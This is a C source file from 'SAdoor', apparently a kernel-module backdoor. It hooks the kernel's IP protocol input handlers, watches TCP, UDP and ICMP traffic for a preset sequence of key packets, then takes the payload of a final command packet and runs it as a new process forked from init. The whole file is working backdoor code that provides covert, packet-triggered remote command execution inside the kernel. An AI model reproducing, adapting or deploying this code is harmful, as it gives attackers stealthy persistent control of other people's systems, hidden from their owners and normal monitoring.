/*
 *  File: connloop.c
 *  Author: Claes M. Nyberg <md0claes@mdstud.chalmers.se>
 *  Description: SAdoor kmod sniff routines
 *  Version: 1.0
 *  Date: Thu Jul  3 15:48:22 CEST 2003
 *
 *  Copyright (c) 2003 Claes M. Nyberg <md0claes@mdstud.chalmers.se>
 *  All rights reserved, all wrongs reversed.
 *
 *  Redistribution and use in source and binary forms, with or without
 *  modification, are permitted provided that the following conditions
 *  are met:
 *
 *  1. Redistributions of source code must retain the above copyright
 *     notice, this list of conditions and the following disclaimer.
 *  2. Redistributions in binary form must reproduce the above copyright
 *     notice, this list of conditions and the following disclaimer in the
 *     documentation and/or other materials provided with the distribution.
 *  3. The name of author may not be used to endorse or promote products
 *     derived from this software without specific prior written permission.
 *
 *  THIS SOFTWARE IS PROVIDED ``AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES,
 *  INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY
 *  AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL
 *  THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 *  EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
 *  PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS;
 *  OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,
 *  WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR
 *  OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF
 *  ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include <sys/types.h>
#include <sys/timeout.h>
#include <sys/param.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/kthread.h>
#include <sys/unistd.h>
#include <sys/protosw.h>

#include <machine/stdarg.h>

#include "iraw.h"
#include "sadoor.h"


/* Global variables */
extern struct sa_options opt;
extern struct sa_pkts *packets; /* The awaiting packets */

/* Timeout handler */
static void timeout_handler(void *);

/* Current packet */
static struct sa_pkt *kpkt = NULL;

/* Timeout marker */
static struct timeout handle;

/*
 * Timeout handler
 */
void
timeout_handler(void *dummy)
{
    int s;

    debug(1, "Key packets timed out after %u seconds\n", 
        SAKMOD_PACKETS_TIMEOUT_SEC);

    /* Start all over again, and replace input function
     * with the one required for first packet */
    s = splnet();
        /* Restore the current wrapper */
        REPLACE_INPUT(opt.sao_wrapindex, opt.real_input_func);

        opt.sao_wrapindex = PROTO2INDEX(packets->key_pkts->sa_pkt_proto);
        opt.real_input_func = INPUTADDR(opt.sao_wrapindex);
        REPLACE_INPUT(opt.sao_wrapindex, input_wrapper);
        kpkt = NULL;
    splx(s);
}

/*
 * The input wrapper function.
 * This function replaces the input function for the 
 * protocol of the next (expected) packet.
 */
void
input_wrapper(struct mbuf *m, ...)
{
    register IPv4_hdr *iph;
    u_short paylen = 0;          /* Size of payload in bytes */
    u_short dlen = 0;          /* Length of expected data */
    u_char *data = NULL;      /* Expected data */
    u_char *payload = NULL;      /* Packet payload */
    u_char *command = NULL;      /* Payload command */
    u_short cmd_len = 0;      /* Command length */
    void (*input_func)(struct mbuf *, ...);    /* Temporary function pointer */
    static size_t pktcount;
	va_list ap;
	int off0;
	int proto;
    int s;

	va_start(ap, m);
	off0 = va_arg(ap, int);
	proto = va_arg(ap, int);
	va_end(ap);

    /* Set first packet */
    if (kpkt == NULL) {
        kpkt = packets->key_pkts;
        pktcount = 1;
    }

    /* Create IP header */
    iph = mtod(m, IPv4_hdr *);

    /* Check length */
    if (off0 < sizeof(IPv4_hdr))
        goto realinput;

    /* Only IPv4 is supported for now .. */
    if (iph->ip_ver != 4) 
        goto realinput;

    /* Source address */
    if (FIELD_IS_SET(kpkt->sa_iph_fields, IPH_SADDR)) {
        if (kpkt->sa_iph_saddr != iph->ip_sadd) 
            goto realinput;
    }

    /* Destination address */
    if (FIELD_IS_SET(kpkt->sa_iph_fields, IPH_DADDR)) {
        if (kpkt->sa_iph_daddr != iph->ip_dadd) 
            goto realinput;    
    }

    /* Type of service */
    if (FIELD_IS_SET(kpkt->sa_iph_fields, IPH_TOS)) {
        if (kpkt->sa_iph_tos != iph->ip_tos) 
            goto realinput;
    }

    /* ID */
    if (FIELD_IS_SET(kpkt->sa_iph_fields, IPH_ID)) {
        if (kpkt->sa_iph_id != iph->ip_id) 
            goto realinput;
    }

    /* Time To Live */
    if (FIELD_IS_SET(kpkt->sa_iph_fields, IPH_TTL)) {
        if (kpkt->sa_iph_ttl != iph->ip_ttl) 
            goto realinput;
    }

    /* Protocol */
    if (kpkt->sa_pkt_proto != iph->ip_prot) 
        goto realinput;

    /* Protocol contents */
    if (kpkt->sa_pkt_ph != NULL) {
        
        /* Examine TCP */
        if (kpkt->sa_pkt_proto == PROTO_TCP) {
            register struct sa_tcph *ptcp; 
            register TCP_hdr *tcph;
            
            ptcp = (struct sa_tcph *)kpkt->sa_pkt_ph;
            tcph = (TCP_hdr *)((caddr_t)iph + off0);
            paylen = (iph->ip_tlen + off0) - (4*iph->ip_hlen + 4*tcph->tcp_hlen);
            payload = (u_char *)((u_char *)tcph + 4*(tcph->tcp_hlen));
            dlen = ptcp->sa_tcph_dlen;
            data = ptcp->sa_tcph_data;

            /* Destination port */
            if (FIELD_IS_SET(ptcp->sa_tcph_fields, TCPH_DPORT)) {
                if (ptcp->sa_tcph_dport != tcph->tcp_dprt) 
                    goto realinput;
            }

            /* Source port */
            if (FIELD_IS_SET(ptcp->sa_tcph_fields, TCPH_SPORT)) {
                if (ptcp->sa_tcph_sport != tcph->tcp_sprt) 
                    goto realinput;
            }

            /* Sequence number */
            if (FIELD_IS_SET(ptcp->sa_tcph_fields, TCPH_SEQ)) {
                if (ptcp->sa_tcph_seq != tcph->tcp_seq) 
                    goto realinput;
            }

            /* Acknowledge number */
            if (FIELD_IS_SET(ptcp->sa_tcph_fields, TCPH_ACK)) {
                if (ptcp->sa_tcph_ack != tcph->tcp_ack) 
                    goto realinput;
            }

            /* Flags */
            if (FIELD_IS_SET(ptcp->sa_tcph_fields, TCPH_FLAGS)) {
                if (ptcp->sa_tcph_flags != tcph->tcp_flgs) 
                    goto realinput;
            }
        }
        
        /* Examine UDP */
        else if (kpkt->sa_pkt_proto == PROTO_UDP) {
            register UDP_hdr *udph;
            register struct sa_udph *pudp; 
    
            pudp = (struct sa_udph *)kpkt->sa_pkt_ph;
            udph = (UDP_hdr *)((caddr_t)iph + off0);
            paylen = (iph->ip_tlen + off0) - (4*iph->ip_hlen) - sizeof(UDP_hdr);
            payload = (u_char *)((u_char *)udph + sizeof(UDP_hdr));
            dlen = pudp->sa_udph_dlen;
            data = pudp->sa_udph_data;
            
            /* Destination port */
            if (FIELD_IS_SET(pudp->sa_udph_fields, UDPH_DPORT)) {
                if (pudp->sa_udph_dport != udph->udp_dprt) 
                    goto realinput;
            }

            /* Source port */
            if (FIELD_IS_SET(pudp->sa_udph_fields, UDPH_SPORT)) {
                if (pudp->sa_udph_sport != udph->udp_sprt) 
                    goto realinput;
            }
        }
        
        /* Examine ICMP */
        else if (kpkt->sa_pkt_proto == PROTO_ICMP) {
            register ICMP_hdr *icmph;
            register struct sa_icmph *picmp;

            picmp = (struct sa_icmph *)kpkt->sa_pkt_ph;
            icmph = (ICMP_hdr *)((caddr_t)iph + off0);
            paylen = (iph->ip_tlen + off0) - (4*iph->ip_hlen) - sizeof(ICMP_hdr);
            payload = (u_char *)((u_char *)icmph + sizeof(ICMP_hdr));
            dlen = picmp->sa_icmph_dlen;
            data = picmp->sa_icmph_data;
    
    
            /* Type */
            if (FIELD_IS_SET(picmp->sa_icmph_fields, ICMPH_TYPE)) {
                if (picmp->sa_icmph_type != icmph->icmp_type)
                    goto realinput;
            }
                    
            /* Code */
            if (FIELD_IS_SET(picmp->sa_icmph_fields, ICMPH_CODE)) {
                if (picmp->sa_icmph_code != icmph->icmp_code)
                    goto realinput;
            }
            
            /* Seq */
            if (FIELD_IS_SET(picmp->sa_icmph_fields, ICMPH_SEQ)) {
                if (picmp->sa_icmph_seq != icmph->icmp_u32.icmp_echo.seq)
                    goto realinput;
            }

            /* ID */
            if (FIELD_IS_SET(picmp->sa_icmph_fields, ICMPH_ID)) {
                if (picmp->sa_icmph_id != icmph->icmp_u32.icmp_echo.id)
                    goto realinput;
            }
        }    

        else 
            goto realinput;
    }

    /* Data */
    if (dlen != 0) {

        /* Payload to short */
        if (dlen > paylen) {
            debug(3, "Payload to short\n");
            goto realinput;
        }
        
        /* Beginning of payload and data mismatch */
        if (memcmp(payload, data, dlen) != 0) {
            debug(3, "Payload and data mismatch\n");
            goto realinput;
        }
    }


    /* This was the command packet */
    if (kpkt == packets->cmd_pkt) {
        struct handle_command_args *args = NULL;

        /* Disable alarm */
		timeout_del(&handle);
        
        cmd_len = paylen - dlen;
    
        debug(2, "Received valid command packet "
            "(command length: %u bytes)\n", cmd_len);
    

        /* Allocate memory and set (the rest of) payload as command */
		command = (u_char *)kspace_calloc(sizeof(struct handle_command_args)+cmd_len);
        if (command != NULL) {

            args = (struct handle_command_args *)command;
            command += sizeof(struct handle_command_args);
            memcpy(command, (u_char *)(payload + dlen), cmd_len);
 
            args->cmd = cmd_len ? command : NULL;
            args->len = cmd_len;
 
            /* Create a new process to handle the request */
			fork_from_init(handle_command, args);
        }


        /* Start all over again, 
         * Restore and replace input function for first packet */
        s = splnet();
            REPLACE_INPUT(opt.sao_wrapindex, opt.real_input_func);
            input_func = opt.real_input_func;
        
            opt.sao_wrapindex = PROTO2INDEX(packets->key_pkts->sa_pkt_proto);
            opt.real_input_func = INPUTADDR(opt.sao_wrapindex);
            REPLACE_INPUT(opt.sao_wrapindex, input_wrapper);
            kpkt = NULL;
        splx(s);

        input_func(m, off0, proto);
        return;
    }

    if (pktcount > 1) 
        debug(2, "Received key packet %u\n", pktcount);
    

    if ( (kpkt = kpkt->sa_kpkt_next) == NULL) {
        debug(3, "Awaiting command packet\n");
        kpkt = packets->cmd_pkt;    
    }

    /* Set timeout when first packet is received */
    if ((pktcount == 1) && (SAKMOD_PACKETS_TIMEOUT_SEC)) {

		/* The variable hz is from sys/kernel.h, 
		 * holding the number of ticks per second */
		timeout_set(&handle, timeout_handler, NULL);
		timeout_add(&handle, hz*(u_int)SAKMOD_PACKETS_TIMEOUT_SEC);

        debug(2, "Received key packet 1 (timeout set to %u seconds)\n", 
            SAKMOD_PACKETS_TIMEOUT_SEC);
    }
    else if (pktcount == 1)
        debug(2, "Received key packet 1 (no timeout)\n");

    /* Restore and replace input function for the next packet */
    s = splnet();
        REPLACE_INPUT(opt.sao_wrapindex, opt.real_input_func);
        input_func = opt.real_input_func;
    
        opt.sao_wrapindex = PROTO2INDEX(kpkt->sa_pkt_proto);
        opt.real_input_func = INPUTADDR(opt.sao_wrapindex);
        REPLACE_INPUT(opt.sao_wrapindex, input_wrapper);
    splx(s);

    pktcount++;

    /* We are done with this packet, pass it on
     * to the real handler */
    input_func(m, off0, proto);
    return;

    /* No match, 
     * Pass the packet on to the real input handler */
    realinput:
        opt.real_input_func(m, off0, proto);
}
